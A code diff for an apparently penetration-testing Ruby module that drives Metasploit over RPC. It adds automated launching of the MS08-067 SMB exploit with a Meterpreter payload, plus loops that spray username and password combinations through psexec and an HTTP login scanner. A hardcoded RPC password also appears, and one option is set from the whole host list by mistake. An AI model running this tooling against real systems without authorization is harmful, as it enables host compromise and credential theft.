@@ -18,7 +18,7 @@ module Metaworld
 	
 		def initialize
 			@system = "127.0.0.1"
-			@username = "jcran"
+			@username = "test"
 			@password = "bC}W0k8$"
 			@port = "3790"
 			
@@ -29,10 +29,6 @@ module Metaworld
 			end
 		end
 			
-		def do_something
-			raise "Not implemented"
-		end
-
 		def run_module
 			raise "Not Implemented"
 		end
@@ -57,6 +53,19 @@ module Metaworld
 		end
 	end
 
+	def get_valid_cred_count
+		self.setup unless @client
+		cred_list = @client.rpc.call("db.creds", {})
+		
+		if cred_list
+			return cred_list.count
+		else
+			return 0 
+		end
+	
+	end
+
+
 	def check_logins(type="smb",systems,usernames,passwords)
 		self.setup unless @client
 
@@ -68,28 +77,65 @@ module Metaworld
 			_check_smb(systems,usernames,passwords)
 		elsif type == "ssh"
 			_check_ssh(systems,usernames,passwords)
+		elsif type == "http"
+			_check_http(systems,usernames,passwords)
 		else 
 			raise "Don't know how to test for that"
 		end
 	end
+
+	def run_module(module_name, systems, options={})
+		self.setup unless @client
+		systems = systems.split("\n")
 	
+		systems.each do |system|
+		
+			# This is where we can do the appropriate setup for each module that we
+			# want to run. 
+			if module_name == "windows/smb/ms08_067_netapi"
+						module_type = "exploit"
+						module_name = "exploit/windows/smb/ms08_067_netapi"
+						payload_name = "windows/meterpreter/bind_tcp"
+						options_string = "RHOST=#{systems}"
+			else 
+				raise "Don't know how to test for that"
+			end		
+
+			# This stuff should be consistent acreoss modules
+ 			# -----------------------------------------------
+			# Start out with an empty settings hash	and pull out each of the options
+			options_hash = {}
+			options_string.split(",").each{ |setting| options_hash["#{setting.split("=").first}"] = setting.split("=").last }
+
+			# Set a default payload unless it's already been set by the user
+			options_hash["PAYLOAD"] = "windows/meterpreter/bind_tcp" unless options_hash["PAYLOAD"]
+
+			# Set a default target unless it's already been set by the user
+			options_hash["TARGET"] = 0 unless options_hash["TARGET"]
+
+			#puts
+			#puts "DEBUG: Module type: #{module_type}"
+			#puts "DEBUG: Module name: #{module_name}"
+			#puts "DEBUG: Options Hash: #{options_hash}"
+			#puts
+			
+			# then call execute
+			@client.rpc.call("module.execute", module_type, module_name, options_hash)	
+		end
+	end
+
 private
 	def _check_ssh
 		raise "Don't know how to test ssh" 		
 	end
 	
-	def _check_http
-		raise "Don't know how to test http"	
-	end
-	
-	def _check_smb(systems,usernames,passwords)
+	def _check_http(systems,usernames,passwords)
 		systems.each do |system|
 			usernames.each do |username|
 				passwords.each do |password|
 					module_type = "exploit"
-					module_name = "windows/smb/psexec"
-					payload_name = "windows/meterpreter/bind_tcp"
-					option_string = "SMBUser=#{username},SMBPass=#{password},RHOST=#{system}"
+					module_name = "auxiliary/scanner/http/http_login"
+					options_string = "RHOSTS=#{system},USERNAME=#{username},PASSWORD=#{password}"
 	
 					# Start out with an empty settings hash	and pull out each of the options
 					options_hash = {}
@@ -101,11 +147,49 @@ private
 					# Set a default target unless it's already been set by the user
 					options_hash["TARGET"] = 0 unless options_hash["TARGET"]
 		
+					#puts
+					#puts "DEBUG: Module type: #{module_type}"
+					#puts "DEBUG: Module name: #{module_name}"
+					#puts "DEBUG: Options Hash: #{options_hash}"
+					#puts
+					
+					# then call execute
+					@client.rpc.call("module.execute", module_type, module_name, options_hash)	
+				end
+			end
+		end
+	end
+	
+	def _check_smb(systems,usernames,passwords)
+		systems.each do |system|
+			usernames.each do |username|
+				passwords.each do |password|
+					module_type = "exploit"
+					module_name = "windows/smb/psexec"
+					payload_name = "windows/meterpreter/bind_tcp"
+					options_string = "SMBUser=#{username},SMBPass=#{password},RHOST=#{system}"
+	
+					# Start out with an empty settings hash	and pull out each of the options
+					options_hash = {}
+					options_string.split(",").each{ |setting| options_hash["#{setting.split("=").first}"] = setting.split("=").last }
+
+					# Set a default payload unless it's already been set by the user
+					options_hash["PAYLOAD"] = "windows/meterpreter/bind_tcp" unless options_hash["PAYLOAD"]
+	
+					# Set a default target unless it's already been set by the user
+					options_hash["TARGET"] = 0 unless options_hash["TARGET"]
+		
+					#puts
+					#puts "DEBUG: Module type: #{module_type}"
+					#puts "DEBUG: Module name: #{module_name}"
+					#puts "DEBUG: Options Hash: #{options_hash}"
+					#puts
+					
 					# then call execute
 					@client.rpc.call("module.execute", module_type, module_name, options_hash)	
 				end
 			end
 		end		
 	end
-	
+
 end
